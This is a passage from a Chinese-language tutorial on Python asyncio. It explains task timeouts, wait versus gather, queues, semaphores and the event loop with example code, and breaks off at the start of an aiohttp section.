class="hljs-built_in">format</span>(i)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>)])<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;start&#x27;</span>)<br>    group3.cancel()  <span class="hljs-comment"># 分组的任务可以通过调用Task.cancel()来取消</span><br>    results = <span class="hljs-keyword">await</span> asyncio.gather(group1, group2, group3, return_exceptions=<span class="hljs-literal">True</span>)<br>    <span class="hljs-built_in">print</span>(results)<br><br><br>asyncio.run(main())<br></code></pre></td></tr></table></figure><h4 id="单任务等待"><a href="#单任务等待" class="headerlink" title="单任务等待"></a>单任务等待</h4><ul><li><code>asyncio.wait_for(aw, timeout, *)</code><ul><li>等待 <em>aw</em> 可等待对象完成，在指定 timeout 秒数后超时。</li><li>如果 <em>aw</em> 是一个协程，它将自动被作为任务调度。</li><li>如果 <em>timeout</em> 为 <code>None</code>，则等待直到完成。</li><li>如果发生超时，任务将取消并引发 <code>asyncio.TimeoutError</code>。</li><li>要避免任务取消，可以加上 <code>asyncio.shield()</code>。</li></ul></li></ul><p><strong>示例：单任务超时取消</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> asyncio<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">eternity</span>():</span><br>    <span class="hljs-comment"># Sleep for one hour</span><br>    <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">3600</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;hi&#x27;</span>)<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    <span class="hljs-comment"># Wait for at most 1 second</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">await</span> asyncio.wait_for(eternity(), timeout=<span class="hljs-number">1.0</span>)<br>    <span class="hljs-keyword">except</span> asyncio.TimeoutError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;timeout&#x27;</span>)<br><br><br>asyncio.run(main())<br></code></pre></td></tr></table></figure><h4 id="多任务等待"><a href="#多任务等待" class="headerlink" title="多任务等待"></a>多任务等待</h4><ul><li><p><code>asyncio.wait(aws, *, timeout=None, return_when=ALL_COMPLETED)</code></p><ul><li><p>并发地运行 <em>aws</em>  可迭代对象中的所有可等待对象，并进入阻塞状态直到满足 <em>return_when</em> 所指定的条件。</p></li><li><p>返回两个 Task/Future 集合：<code>(done, pending)</code>。</p></li><li><p>此函数不会引发 <code>asyncio.TimeoutError</code>，当超时发生时，未完成的 Task/Future 将在指定秒数后被返回。</p></li><li><p><em>return_when</em> 指定此函数应在何时返回，它必须为以下常数之一：</p><table><thead><tr><th align="left">常数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><code>FIRST_COMPLETED</code></td><td align="left">函数将在任意可等待对象结束或取消时返回</td></tr><tr><td align="left"><code>FIRST_EXCEPTION</code></td><td align="left">函数将在任意可等待对象因引发异常而结束时返回，当没有引发任何异常时它就相当于 <code>ALL_COMPLETED</code></td></tr><tr><td align="left"><code>ALL_COMPLETED</code></td><td align="left">函数将在 <strong>所有</strong> 可等待对象结束或取消时返回</td></tr></tbody></table></li><li><p>与 <code>wait_for()</code> 不同，<code>wait()</code> 在超时发生时不会取消可等待对象。</p></li></ul></li></ul><p><strong>示例：多任务超时取消</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> asyncio<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">foo</span>():</span><br>    <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">42</span><br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bar</span>():</span><br>    <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">3600</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">21</span><br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    t1 = asyncio.create_task(foo())<br>    t2 = asyncio.create_task(bar())<br><br>    done, pending = <span class="hljs-keyword">await</span> asyncio.wait([t1, t2], timeout=<span class="hljs-number">2.0</span>)<br><br>    <span class="hljs-keyword">if</span> t1 <span class="hljs-keyword">in</span> done:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;The task&#x27;s result is <span class="hljs-subst">&#123;t1.result()&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;The task&#x27;s status is <span class="hljs-subst">&#123;t1.done()&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> pending:<br>        p.cancel()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;cancel task: <span class="hljs-subst">&#123;p.get_name()&#125;</span>&#x27;</span>)<br><br>        <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">1</span>)<br>        <span class="hljs-built_in">print</span>(asyncio.all_tasks())<br><br><br>asyncio.run(main())<br></code></pre></td></tr></table></figure><blockquote><p>gather 和 wait 的区别：<code>asyncio.gather()</code> 和 <code>asyncio.wait()</code> 都可以并发执行多个协程对象或任务，但 <em>gather</em> 主要用于收集结果，它会返回一个列表，按照给定的顺序返回结果；而 <em>wait</em> 会返回一个元组（done, pending），分别表示 <em>已完成任务列表</em> 和 <em>未完成任务列表</em>，列表中的每个任务都是一个 <em>Task</em> 实例，可以通过 <code>task.result()</code> 获得协程返回值。此外，<em>wait</em> 可以指定函数的返回时机和超时时间，是比 <em>gather</em> 更低层级的调用方式。</p></blockquote><h4 id="内省"><a href="#内省" class="headerlink" title="内省"></a>内省</h4><ul><li><p><code>asyncio.current_task(loop=None)</code></p><ul><li>返回当前运行的 <em>Task</em> 实例，如果没有正在运行的任务则返回 <code>None</code>。</li><li>如果 <em>loop</em> 为 <code>None</code> 则会使用 <code>get_running_loop()</code> 获取当前事件循环。</li></ul></li><li><p><code>asyncio.all_tasks(loop=None)</code></p><ul><li>返回事件循环所运行的未完成的 <em>Task</em> 实例的集合。</li><li>如果 <em>loop</em> 为 <code>None</code> 则会使用 <code>get_running_loop()</code> 获取当前事件循环。</li></ul></li></ul><h3 id="流"><a href="#流" class="headerlink" title="流"></a><a href="https://docs.python.org/zh-cn/3/library/asyncio-stream.html">流</a></h3><p>流是用于处理网络连接的支持 async/await 的高层级原语。 流允许发送和接收数据，而不需要使用回调或低级协议和传输。</p><h3 id="队列"><a href="#队列" class="headerlink" title="队列"></a><a href="https://docs.python.org/zh-cn/3/library/asyncio-queue.html">队列</a></h3><p>asyncio 队列被设计成与 <code>queue</code> 模块类似，专用于 <code>async/await</code> 代码，但它 <strong>不是线程安全</strong> 的。asyncio 的队列没有 <em>timeout</em> 形参，使用 <code>asyncio.wait_for()</code> 函数为队列添加超时操作。</p><p><strong>使用说明</strong></p><p>asyncio.queues 模块提供的类：</p><ul><li>Queue(maxsize=0, *)：先进先出队列</li><li>LifoQueue(maxsize=0, *)：后进先出队列</li><li>PriorityQueue(maxsize=0, *)：优先级队列</li></ul><p>asyncio.queues 模块提供的常用方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">queue.qsize()  <span class="hljs-comment"># 返回队列的大小（准确值）</span><br>queue.empty()  <span class="hljs-comment"># 返回队列是否为空</span><br>queue.full()  <span class="hljs-comment"># 返回队列是否为满</span><br>queue.put(item)  <span class="hljs-comment"># coroutine方法，向队列中插入一个元素，如果队列为满则阻塞</span><br>queue.put_nowait(item)  <span class="hljs-comment"># 立即向队列中插入一个元素，如果队列为满则引发QueueFull异常</span><br>queue.get()  <span class="hljs-comment"># coroutine方法，从队列中获取一个元素并返回，如果队列为空则阻塞</span><br>queue.get_nowait()  <span class="hljs-comment"># 立即从队列中获取一个元素并返回，如果队列为空则引发QueueEmpty异常</span><br>queue.task_done()  <span class="hljs-comment"># 同标准queue模块</span><br>queue.join()  <span class="hljs-comment"># coroutine方法，阻塞至队列中所有的元素都被接收和处理完毕</span><br></code></pre></td></tr></table></figure><p><strong>示例：多个并发任务的工作量分配</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> asyncio<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> time<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">worker</span>(<span class="hljs-params">name, queue</span>):</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment"># Get a &quot;work item&quot; out of the queue.</span><br>        sleep_for = <span class="hljs-keyword">await</span> queue.get()<br><br>        <span class="hljs-comment"># Sleep for the &quot;sleep_for&quot; seconds.</span><br>        <span class="hljs-keyword">await</span> asyncio.sleep(sleep_for)<br><br>        <span class="hljs-comment"># Notify the queue that the &quot;work item&quot; has been processed.</span><br>        queue.task_done()<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;name&#125;</span> has slept for <span class="hljs-subst">&#123;sleep_for:<span class="hljs-number">.2</span>f&#125;</span> seconds&#x27;</span>)<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    <span class="hljs-comment"># Create a queue that we will use to store our &quot;workload&quot;.</span><br>    queue = asyncio.Queue()<br><br>    <span class="hljs-comment"># Generate random timings and put them into the queue.</span><br>    total_sleep_time = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>        sleep_for = random.uniform(<span class="hljs-number">0.05</span>, <span class="hljs-number">1.0</span>)<br>        total_sleep_time += sleep_for<br>        queue.put_nowait(sleep_for)<br><br>    <span class="hljs-comment"># Create three worker tasks to process the queue concurrently.</span><br>    tasks = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        task = asyncio.create_task(worker(<span class="hljs-string">f&#x27;worker-<span class="hljs-subst">&#123;i&#125;</span>&#x27;</span>, queue))<br>        tasks.append(task)<br><br>    <span class="hljs-comment"># Wait until the queue is fully processed.</span><br>    started_at = time.monotonic()<br>    <span class="hljs-keyword">await</span> queue.join()<br>    total_slept_for = time.monotonic() - started_at<br><br>    <span class="hljs-comment"># Cancel our worker tasks.</span><br>    <span class="hljs-keyword">for</span> task <span class="hljs-keyword">in</span> tasks:<br>        task.cancel()<br>    <span class="hljs-comment"># Wait until all worker tasks are cancelled.</span><br>    <span class="hljs-keyword">await</span> asyncio.gather(*tasks, return_exceptions=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;====&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;3 workers slept in parallel for <span class="hljs-subst">&#123;total_slept_for:<span class="hljs-number">.2</span>f&#125;</span> seconds&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;total expected sleep time: <span class="hljs-subst">&#123;total_sleep_time:<span class="hljs-number">.2</span>f&#125;</span> seconds&#x27;</span>)<br><br><br>asyncio.run(main())<br></code></pre></td></tr></table></figure><p><strong>queue.Queue &amp; asyncio.Queue</strong></p><p>queue.Queue 和 asyncio.Queue 都是支持多生产者、多消费者的队列，同样是基于 collections.deque 实现，他们都提供了 Queue、LifoQueue、PriorityQueue，所提供的接口也相同。</p><p>区别在于 queue.Queue 适用于多线程场景的通信，asyncio.Queue 适用于协程场景的通信。由于 asyncio 的加成，queue.Queue 下的阻塞接口在 asyncio.Queue 中则是以返回协程对象的方式执行，具体差异如下表：</p><p><img src="/img/Python/v2-15de9fde6c4723e7e36d52c3b9d4ec04_720w.jpg"></p><h3 id="同步原语"><a href="#同步原语" class="headerlink" title="同步原语"></a><a href="https://docs.python.org/zh-cn/3/library/asyncio-sync.html">同步原语</a></h3><p><strong>Semaphore</strong></p><p><code>asyncio.Semaphore(value=1)</code> 信号量对象，非线程安全。</p><p>信号量会管理一个内部计数器，该计数器会随每次 <code>acquire()</code> 调用递减并随每次 <code>release()</code>调用递增。计数器的值永远不会降到零以下；当 <code>acquire()</code> 发现其值为零时，它将保持阻塞直到有某个任务调用了 <code>release()</code>。</p><p>使用 Semaphore 的推荐方式是通过 <code>async with</code> 语句：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">sem = asyncio.Semaphore(<span class="hljs-number">10</span>)<br><span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> sem:<br>    <span class="hljs-comment"># work with shared resource</span><br><br>---------<br><span class="hljs-comment"># 上述代码等价于：</span><br><span class="hljs-keyword">await</span> sem.acquire()<br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-comment"># work with shared resource</span><br><span class="hljs-keyword">finally</span>:<br>    sem.release()<br></code></pre></td></tr></table></figure><p><strong>示例：协程使用 Semaphore 限制并发量</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> asyncio<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hello</span>(<span class="hljs-params">sem</span>):</span><br>    <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> sem:<br>        <span class="hljs-built_in">print</span>(asyncio.current_task())<br>        <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">1</span>)<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    tasks = []<br>    sem = asyncio.Semaphore(<span class="hljs-number">10</span>)  <span class="hljs-comment"># 并发执行数为5</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):  <span class="hljs-comment"># 启动100个协程</span><br>        tasks.append(asyncio.create_task(hello(sem)))<br>    <span class="hljs-keyword">await</span> asyncio.gather(*tasks)<br><br><br>asyncio.run(main())<br></code></pre></td></tr></table></figure><h3 id="子进程"><a href="#子进程" class="headerlink" title="子进程"></a><a href="https://docs.python.org/zh-cn/3/library/asyncio-subprocess.html">子进程</a></h3><p>本节介绍了用于创建和管理子进程的高层级 async/await asyncio API。</p><h3 id="复合语句"><a href="#复合语句" class="headerlink" title="复合语句"></a><a href="https://docs.python.org/zh-cn/3/reference/compound_stmts.html#coroutines">复合语句</a></h3><p><strong>异步迭代器 async for</strong></p><p><code>async for</code> 语句允许方便地对异步可迭代对象进行迭代。</p><p><strong>异步上下文管理器 async with</strong></p><p><code>async with</code> 语句是一种上下文管理器，能够在其 <em>enter</em> 和 <em>exit</em> 方法中暂停执行。</p><h3 id="代码示例-1"><a href="#代码示例-1" class="headerlink" title="代码示例"></a>代码示例</h3><p><strong>示例一：使用协程方法替换普通方法</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 非协程版本</span><br><span class="hljs-keyword">import</span> time<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">crawl_page</span>(<span class="hljs-params">url</span>):</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;crawling &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(url))<br>    sleep_time = <span class="hljs-built_in">int</span>(url.split(<span class="hljs-string">&#x27;_&#x27;</span>)[-<span class="hljs-number">1</span>])<br>    time.sleep(sleep_time)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;OK &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(url))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">urls</span>):</span><br>    <span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls:<br>        crawl_page(url)<br><br><br>ts = time.time()<br>main([<span class="hljs-string">&#x27;url_1&#x27;</span>, <span class="hljs-string">&#x27;url_2&#x27;</span>, <span class="hljs-string">&#x27;url_3&#x27;</span>, <span class="hljs-string">&#x27;url_4&#x27;</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;all time: &#123;:.2f&#125;s&#x27;</span>.<span class="hljs-built_in">format</span>(time.time() - ts))  <span class="hljs-comment"># 10.03s</span><br><br>---------<br><span class="hljs-comment"># 协程版本</span><br><span class="hljs-keyword">import</span> asyncio<br><span class="hljs-keyword">import</span> time<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">crawl_page</span>(<span class="hljs-params">url</span>):</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;crawling &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(url))<br>    sleep_time = <span class="hljs-built_in">int</span>(url.split(<span class="hljs-string">&#x27;_&#x27;</span>)[-<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">await</span> asyncio.sleep(sleep_time)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;OK &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(url))<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">urls</span>):</span><br>    tasks = [asyncio.create_task(crawl_page(url)) <span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls]  <span class="hljs-comment"># 创建task</span><br>    <span class="hljs-keyword">for</span> task <span class="hljs-keyword">in</span> tasks:  <span class="hljs-comment"># 或把for循环替换为 await asyncio.gather(*tasks) 其中*tasks为解包列表</span><br>        <span class="hljs-keyword">await</span> task<br><br><br>ts = time.time()<br>asyncio.run(main([<span class="hljs-string">&#x27;url_1&#x27;</span>, <span class="hljs-string">&#x27;url_2&#x27;</span>, <span class="hljs-string">&#x27;url_3&#x27;</span>, <span class="hljs-string">&#x27;url_4&#x27;</span>]))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;all time: &#123;:.2f&#125;s&#x27;</span>.<span class="hljs-built_in">format</span>(time.time() - ts))  <span class="hljs-comment"># 4.01s</span><br></code></pre></td></tr></table></figure><p><strong>示例二：使用协程实现生产者-消费者模型</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> asyncio<br><span class="hljs-keyword">import</span> random<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">consumer</span>(<span class="hljs-params">queue, number</span>):</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        val = <span class="hljs-keyword">await</span> queue.get()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#123;&#125; get a val: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(number, val))<br>        <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">1</span>)<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">producer</span>(<span class="hljs-params">queue, number</span>):</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>        val = random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>)<br>        <span class="hljs-keyword">await</span> queue.put(val)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#123;&#125; put a val: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(number, val))<br>        <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">1</span>)<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    queue = asyncio.Queue()<br><br>    consumer_1 = asyncio.create_task(consumer(queue, <span class="hljs-string">&#x27;consumer_1&#x27;</span>))<br>    consumer_2 = asyncio.create_task(consumer(queue, <span class="hljs-string">&#x27;consumer_2&#x27;</span>))<br><br>    producer_1 = asyncio.create_task(producer(queue, <span class="hljs-string">&#x27;producer_1&#x27;</span>))<br>    producer_2 = asyncio.create_task(producer(queue, <span class="hljs-string">&#x27;producer_2&#x27;</span>))<br><br>    <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">10</span>)  <span class="hljs-comment"># 执行10s</span><br>    consumer_1.cancel()<br>    consumer_2.cancel()<br><br>    <span class="hljs-keyword">await</span> asyncio.gather(consumer_1, consumer_2, producer_1, producer_2, return_exceptions=<span class="hljs-literal">True</span>)<br><br><br>asyncio.run(main())<br></code></pre></td></tr></table></figure><h3 id="事件循环"><a href="#事件循环" class="headerlink" title="事件循环"></a><a href="https://docs.python.org/zh-cn/3/library/asyncio-eventloop.html">事件循环</a></h3><p>事件循环是每个 asyncio 应用的核心。 事件循环会运行异步任务和回调，执行网络 IO 操作，以及运行子进程。</p><p>应用开发者通常应当使用高层级的 asyncio 函数，例如 <a href="https://docs.python.org/zh-cn/3/library/asyncio-task.html#asyncio.run"><code>asyncio.run()</code></a>，应当很少有必要引用循环对象或调用其方法。 本节所针对的主要是低层级代码、库和框架的编写者，他们需要更细致地控制事件循环行为。</p><p>以下低层级函数可被用于获取、设置或创建事件循环:</p><ul><li><p><code>asyncio.``get_running_loop</code>()</p><p>返回当前 OS 线程中正在运行的事件循环。如果没有正在运行的事件循环则会引发 <a href="https://docs.python.org/zh-cn/3/library/exceptions.html#RuntimeError"><code>RuntimeError</code></a>。 此函数只能由协程或回调来调用。<em>3.7 新版功能.</em></p></li><li><p><code>asyncio.``get_event_loop</code>()</p><p>获取当前事件循环。如果当前 OS 线程没有设置当前事件循环，该 OS 线程为主线程，并且 <a href="https://docs.python.org/zh-cn/3/library/asyncio-eventloop.html#asyncio.set_event_loop"><code>set_event_loop()</code></a> 还没有被调用，则 asyncio 将创建一个新的事件循环并将其设为当前事件循环。由于此函数具有相当复杂的行为（特别是在使用了自定义事件循环策略的时候），更推荐在协程和回调中使用 <a href="https://docs.python.org/zh-cn/3/library/asyncio-eventloop.html#asyncio.get_running_loop"><code>get_running_loop()</code></a> 函数而非 <a href="https://docs.python.org/zh-cn/3/library/asyncio-eventloop.html#asyncio.get_event_loop"><code>get_event_loop()</code></a>。应该考虑使用 <a href="https://docs.python.org/zh-cn/3/library/asyncio-task.html#asyncio.run"><code>asyncio.run()</code></a> 函数而非使用低层级函数来手动创建和关闭事件循环。<em>3.10 版后已移除:</em> 如果没有正在运行的事件循环则会发出弃用警告。 在未来的 Python 发行版中，此函数将成为 <a href="https://docs.python.org/zh-cn/3/library/asyncio-eventloop.html#asyncio.get_running_loop"><code>get_running_loop()</code></a> 的别名。</p></li><li><p><code>asyncio.``set_event_loop</code>(<em>loop</em>)</p><p>将 <em>loop</em> 设置为当前 OS 线程的当前事件循环。</p></li><li><p><code>asyncio.``new_event_loop</code>()</p><p>创建一个新的事件循环。</p></li></ul><h2 id="aiohttp-库"><a href="#aiohttp-库" class="headerlink" title="aiohttp 库"></a><a href="https://docs.aiohttp.org/en/stable/index.html">aiohttp 库</a></h2><p>基于 asyncio 框架实现的异步 HTTP 客户端/服务器，用于替代 requests 库。</p><h3 id="代码示例-2"><a href="#代码示例-2" class="headerlink" title="代码示例"></a>代码示例</h3><p><strong>示例一：简单使用</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># client</span><br><span class="hljs-keyword">import</span> 